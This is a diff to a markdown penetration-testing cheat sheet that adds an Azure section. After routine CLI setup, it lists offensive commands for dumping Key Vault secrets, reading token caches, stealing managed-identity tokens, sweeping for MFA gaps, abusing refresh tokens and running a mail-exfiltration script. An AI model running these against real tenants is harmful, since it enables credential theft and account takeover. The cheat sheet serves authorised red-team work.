@@ -5,9 +5,9 @@
 ## Table of Contents
 
 - [AWS](#aws)
-- [Entra](#entra)
 - [GraphRunner](#graphrunner)
 - [lazys3](#lazys3)
+- [Microsoft Azure](#microsoft-azure)
 - [Pacu](#pacu)
 - [S3 Account Search](#s3-account-search)
 
@@ -904,6 +904,284 @@ PS> Invoke-SecurityGroupCloner -Tokens $tokens
 
 ```console
 $ ruby lazys3.rb <DOMAIN>
+```
+
+## Microsoft Azure
+
+### Azure CLI
+
+> https://learn.microsoft.com/en-us/cli/azure/
+
+#### Installation
+
+```console
+PS C:\> winget install -e --id Microsoft.AzureCLI
+```
+
+```console
+PS C:\> az --version
+```
+
+#### PowerShell Profile Customization
+
+```shell
+$ vi $profile
+```
+
+```cmd
+Register-ArgumentCompleter -Native -CommandName az -ScriptBlock {
+    param($commandName, $wordToComplete, $cursorPosition)
+    $completion_file = New-TemporaryFile
+    $env:ARGCOMPLETE_USE_TEMPFILES = 1
+    $env:_ARGCOMPLETE_STDOUT_FILENAME = $completion_file
+    $env:COMP_LINE = $wordToComplete
+    $env:COMP_POINT = $cursorPosition
+    $env:_ARGCOMPLETE = 1
+    $env:_ARGCOMPLETE_SUPPRESS_SPACE = 0
+    $env:_ARGCOMPLETE_IFS = "`n"
+    $env:_ARGCOMPLETE_SHELL = 'powershell'
+    az 2>&1 | Out-Null
+    Get-Content $completion_file | Sort-Object | ForEach-Object {
+        [System.Management.Automation.CompletionResult]::new($_, $_, "ParameterValue", $_)
+    }
+    Remove-Item $completion_file, Env:\_ARGCOMPLETE_STDOUT_FILENAME, Env:\ARGCOMPLETE_USE_TEMPFILES, Env:\COMP_LINE, Env:\COMP_POINT, Env:\_ARGCOMPLETE, Env:\_ARGCOMPLETE_SUPPRESS_SPACE, Env:\_ARGCOMPLETE_IFS, Env:\_ARGCOMPLETE_SHELL
+}
+```
+
+```cmd
+Set-PSReadlineKeyHandler -Key Tab -Function MenuComplete
+```
+
+### Common Commands
+
+```cmd
+PS C:\> az login
+PS C:\> az account show
+PS C:\> Connect-MgGraph
+PS C:\> Connect-AzAccount
+PS C:\> az ad signed-in-user show
+PS C:\> Get-MgContext
+PS C:\> GetMgUser -UserId <EMAIL>
+PS C:\> az logout
+PS C:\> Disconnect-AzAccount
+```
+
+### Install and Import Modules
+
+```cmd
+PS C:\> Install-Module Microsoft.Graph
+PS C:\> Import-Module Microsoft.Graph.Users
+PS C:\> Connect-MgGraph
+```
+
+```cmd
+PS C:\> Install-Module Az
+PS C:\> Import-Module Az
+PS C:\> Connect-AzAccount
+```
+
+### User Information
+
+#### Get User Information
+
+```cmd
+PS C:\> Get-MgUser -UserId <EMAIL>
+```
+
+```cmd
+PS C:\> $UserId = '<ID>'
+```
+
+```cmd
+PS C:\> Get-MgUserMemberOf -userid $userid | select * -ExpandProperty additionalProperties | Select-Object {$_.AdditionalProperties["displayName"]}
+```
+
+### Group Memberships
+
+#### Get Memberships
+
+```cmd
+PS C:\> Get-MgUserMemberOf -userid "<EMAIL>" | select * -ExpandProperty additionalProperties | Select-Object {$_.AdditionalProperties["displayName"]}
+```
+
+### Roles
+
+#### Get Role Permissions
+
+```cmd
+PS C:\> Get-AzRoleAssignment -Scope "/subscriptions/<SUBSCRIPTION>" | Select-Object DisplayName, RoleDefinitionName
+```
+
+#### Get Role Definition
+
+```cmd
+PS C:\> az role definition list --custom-role-only true --query "[?roleName=='<ROLE>']" -o json
+```
+
+### Storage
+
+#### List Storage Accounts
+
+```cmd
+PS C:\> az storage account list --query "[].name" -o tsv
+```
+
+#### List Storage Tables
+
+```cmd
+PS C:\> az storage table list --account-name <STORAGE_ACCOUNT> --output table --auth-mode login
+```
+
+#### Query Storage Table Content
+
+```cmd
+PS C:\> az storage entity query --table-name customers --account-name <STORAGE_ACCOUNT> --output table --auth-mode login
+```
+
+### Enumerate Entra ID
+
+```cmd
+PS C:\> $CurrentSubscriptionID = "<SUBSCRIPTION>"
+PS C:\> $OutputFormat = "table"
+PS C:\> & az account set --subscription $CurrentSubscriptionID
+PS C:\> & az resource list -o $OutputFormat
+```
+
+### Enumerate Key Vaults
+
+```cmd
+PS C:\> $VaultName = "<VAULT>"
+PS C:\> $SubscriptionID = "<SUBSCRIPTION>"
+PS C:\> az account set --subscription $SubscriptionID
+```
+
+```cmd
+PS C:\> $secretsJson = az keyvault secret list --vault-name $VaultName -o json
+PS C:\> $secrets = $secretsJson | ConvertFrom-Json
+```
+
+```cmd
+PS C:\> $keysJson = az keyvault key list --vault-name $VaultName -o json
+PS C:\> $keys = $keysJson | ConvertFrom-Json
+```
+
+```cmd
+PS C:\> Write-Host "Secrets in vault $VaultName"
+foreach ($secret in $secrets) {
+    Write-Host $secret.id
+}
+```
+
+```cmd
+PS C:\> Write-Host "Keys in vault $VaultName"
+foreach ($key in $keys) {
+    Write-Host $key.id
+}
+```
+
+#### Retrieve Secrets
+
+```cmd
+PS C:\> $VaultName = "<VAULT>"
+PS C:\> $SecretNames = @("<USERNAME>", "<USERNAME>", "<USERNAME>")
+```
+
+```cmd
+PS C:\> $SubscriptionID = "<SUBSCRIPTION>"
+PS C:\> az account set --subscription $SubscriptionID
+```
+
+```cmd
+PS C:\> Write-Host "Secret Values from vault $VaultName"
+PS C:\> foreach ($SecretName in $SecretNames) {
+    $secretValueJson = az keyvault secret show --name $SecretName --vault-name $VaultName -o json
+    $secretValue = ($secretValueJson | ConvertFrom-Json).value
+    Write-Host "$SecretName - $secretValue"
+}
+```
+
+#### Query for Password Reuse
+
+```cmd
+PS C:\> az ad user list --query "[?givenName=='<USERNAME>' || givenName=='<USERNAME>' || givenName=='<USERNAME>'].{Name:displayName, UPN:userPrincipalName, JobTitle:jobTitle}" -o table
+```
+
+### Privilege Escalation
+
+```console
+PS C:\> az login --service-principal -u "20acc5dd-ffv4-41ac-a1p5-d321328da49a" --certificate <CERTIFICATE>.pem --tenant "2590cdef-687d-493c-ae4d-442cbab53a72"
+```
+
+```console
+PS C:\> az resource list
+```
+
+```console
+PS C:\> az role assignment list --all
+```
+
+```console
+PS C:\> az webapp ssh --resource-group <GROUP> --name <NAME>
+```
+
+```console
+$ env
+```
+
+```console
+$ env | grep IDENTITY
+```
+
+```console
+$ curl -s -H "X-Identity-Header: $IDENTITY_HEADER" "$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=https://management.azure.com/”
+```
+
+```console
+PS C:\> Connect-AzAccount -AccessToken
+```
+
+### Token Abuse for MFA Bypass
+
+> https://github.com/dafthack/MFASweep/
+
+```console
+PS C:\> Import-Module ./MFASweep.ps1
+PS C:\> Invoke-MFASweep -Username <USERNAME>@<DOMAIN> -Password <PASSWORD>
+PS C:\> az login -u <USERNAME>@<DOMAIN> -p <PASSWORD>
+```
+
+```console
+PS C:\> cat  ~/.azure/msal_token_cache.json
+```
+
+or
+
+```console
+PS C:\> cat  ~/.Azure/msal_token_cache.json
+```
+
+> https://github.com/f-bader/TokenTacticsV2
+
+```console
+PS C:\> Import-Module .\TokenTactics.psm1
+PS C:\> Invoke-RefreshToMSGraphToken -domain <DOMAIN> -refreshToken "<TOKEN>"
+PS C:\> $MSGraphToken
+PS C:\> $MSGraphToken.access_token
+```
+
+or
+
+```console
+$ curl -s https://raw.githubusercontent.com/f-bader/TokenTacticsV2/main/modules/Get-
+ForgedUserAgent.ps1 | grep UserAgent | awk -F"= " '{ print $2 }' | sort -u
+```
+
+> https://github.com/rootsecdev/Azure-Red-Team
+
+> https://github.com/rootsecdev/Azure-Red-Team/blob/master/Tokens/exfil_exchange_mail.py
+
+```console
+$ python3 exfil_exchange_mail.py
 ```
 
 ## Pacu
